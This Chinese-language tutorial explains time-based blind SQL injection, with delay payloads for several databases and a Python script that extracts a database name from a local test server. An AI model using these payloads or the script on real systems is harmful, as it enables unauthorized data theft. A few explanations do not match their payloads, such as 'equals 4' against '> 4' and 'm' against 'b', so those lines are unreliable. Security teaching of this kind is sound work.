## 基于时间的 SQL 注入

在基于布尔的盲 SQL 注入中，我们通常比较真假语句的结果来枚举数据库。但是，想象一种情况，真假语句的结果之间没有明显差异，并且数据库不返回任何错误。这种场景通常被称为完全盲 SQL 注入攻击。

设计出一个根据攻击者指定的条件造成时间延迟的查询。攻击者可以提交设计的查询，然后监控服务器做出响应所花的时间。如果发生延迟，攻击者可推断条件为真。即使在两种情况下应用程序的响应完全相同，攻击者仍然可根据是否存在时间延迟从数据库中提取一比特数据。通过大量执行这类查询，攻击者就能够系统性地从数据库中提取任何复杂的数据，每次一比特。

使用目标数据库中可用于延迟响应的函数：
- MySQL，`SLEEP()` 和 `BENCHMARK()`
- MSSQL，`WAITFOR DELAY`
- PostgreSQL，`pg_sleep()`

> 在5.0.12版本之前的 MySQL 中，不能使用睡眠函数，但可以使用基准函数 `benchmark` 重复执行一个特定的操作。指示数据库执行一个处理器密集型操作，如 SHA-1 散列，大量的操作次数将造成一次可测量的时间延迟。

> 在 Oracle 中，没有产生时间延迟的内置方法，一种方法是使用`UTL_HTTP`连接一个不存在的服务器，造成一次操作超时。这会使数据库尝试与指定的服务器建立连接，并最终造成超时。

> 注入上下文中，尝试
> 1. 限制最少的堆叠 `;`
> 2. 隐式类型转换，如字符串拼接
> 3. 条件语句连接

### 测试基于时间的 SQL 注入

要测试基于时间的 SQL 注入，我们可以使用 MySQL 中的 `IF` 语句。以下是通用语法。

**语法**
```sql
IF(condition, true_statement, false_statement)
```

考虑以下 SQL 查询：

```sql
SELECT * FROM products WHERE id_product=$id_product
```

同时考虑执行上述查询的脚本请求：

`https://www.example.com/product.php?id=10`

恶意请求将是（例如 MySql 5.x）：

```sql
$id=10 AND IF(version() like '5%', sleep(10), 0)--
```

在此示例中，测试人员正在检查 MySql 版本是否为 5.x，使服务器延迟响应 10 秒。测试人员可以增加延迟时间并监视响应。测试人员也无需完全等待响应。有时他可以设置一个很高的值（例如 100），并在几秒后取消请求。

我们还可以使用 Linux 中的 `time` 命令来确认延迟。

```bash
time curl "URL"
```

### 提高效率

攻击者可以循环使用每个字符的所有可能值，直到发生时间延迟。另外，可以通过减少所需请求的数量，提高攻击的效率。另一个技巧是将每个字节的数据划分成比特，并在每次查询中获得一比特的数据。`POWER`命令和按位“与”运算符`&`可在逐比特的基础上指定条件：
1. `SUBSTRING` 提取一个字符
2. `ASCII` 转字符为 ASCII 编码
3. `& POWER` ASCII 编码按2的幂与，得到比特

### 在初步探测中使用时间延迟

我们已经说明了如何使用时间延迟来获得有用的信息。然而，当对应用程序进行初步探查、检测SQL注入漏洞时，时间延迟技巧也可能非常有用。

在一些完全盲目的SQL注入攻击中，浏览器中不会显示查询结果，所有错误都被应用程序以隐含的方式处理，使用提交专门设计的输入的标准技巧可能很难检测出漏洞。这时，使用时间延迟是在初步探查过程中检测一个漏洞是否存在的最有效方法。

例如，如果后端数据库为MS-SQL，那么可以将下面的两个字符串轮流注入每个请求参数中，并监控应用程序响应请求所用的时间，从而确定漏洞：

- `'; waitfor delay '0:30:0'--`
- `1; waitfor delay '0:30:0'--`

### 使用示例：枚举数据库名称的字符长度

基于此，让我们看看如何确认数据库的长度。考虑以下 payload，如果数据库长度等于 4，则包含五秒延迟。

**Payload**
```sql
' OR IF(LENGTH((SELECT DATABASE())) > 4, SLEEP(5), 0) --
```

使用比较符号确认边界，再使用二分法快速确认实际长度

#### 枚举数据库名称

通过使用相同的原理，我们可以枚举数据库的名称。以下是一些示例：

- 检查第一个字符是否为 `a`（无延迟）：
  ```sql
  ' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) = ASCII('a'), SLEEP(5), 0) --
  ```
类似地，我们可以检查第二个字符，如下所示：

- 检查第二个字符是否为 `m`（无延迟）：
  ```sql
  ' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 2, 1)) = ASCII('b'), SLEEP(5), 0) --
  ```

基于此行为，我们可以自动化逐个字符的枚举过程，因为手动执行可能很困难。为了自动化此过程，我们可以使用如下所示的 Python 脚本。以下脚本将自动确定数据库名称的字符长度，然后逐一提取每个字符：

**POC**
```python
import requests
import urllib.parse

sleep_time = 4
count = 0

# 确认字符串长度
while True:
    count += 1
    url = f"http://127.0.0.1:8080/index.php?id='+OR+IF(LENGTH((SELECT+DATABASE()))+%3d+{count},+SLEEP(5),+0)%20--%20-"
    r = requests.get(url)
    if int(r.elapsed.total_seconds()) >= sleep_time:
        db_length = count
        print("Database character length is: " + str(db_length))
        break

# 爆破字符
db_name = ""
for position in range(1, db_length + 1):
    found = False
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_#":
        url = f"http://127.0.0.1:8080/index.php?id='OR+IF(ASCII(SUBSTRING((SELECT+DATABASE()),+{position},1))+%3d+ASCII('{char}'),+SLEEP({sleep_time}),+0)+--%20-"
        r = requests.get(url)
        if int(r.elapsed.total_seconds()) == sleep_time:
            db_name += char
            print(f"Character {position}: {char}")
            found = True
            break
    if not found:
        print(f"Character {position} not found. Exiting.")
        break

print("Extracted Database Name:", db_name)
```

输出显示提取的数据库名称。

需要考虑的一个重要方面是，当要求数据库返回大量数据时，应用程序本身会花费时间返回请求的信息，然后再加上诱导延迟的额外时间。这可能导致许多工具中的误报，因为它们可能无法准确区分服务器返回数据集所花费的时间与延迟引起的时间。
